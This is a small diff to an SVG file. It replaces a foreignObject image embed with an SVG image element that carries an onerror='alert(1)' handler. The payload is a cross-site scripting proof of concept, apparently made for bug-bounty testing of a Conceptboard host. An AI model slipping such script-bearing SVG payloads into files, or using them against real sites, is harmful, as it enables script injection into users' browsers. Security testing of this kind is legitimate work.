@@ -1,1 +1,3 @@
-<svg xmlns="http://www.w3.org/2000/svg"> <foreignObject width="100%" height="100%"> <body xmlns="http://www.w3.org/1999/xhtml"> <img src="https://bounty.conceptboard.com/__/photo/u_132d650b-0699-4ca9-8982-e0b73aa4734b.large.png?nocache=tgq" /> </body> </foreignObject> </svg>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <image href="https://bounty.conceptboard.com/__/photo/u_132d650b-0699-4ca9-8982-e0b73aa4734b.large.png?nocache=tgq" onerror="alert(1)" />
+</svg>
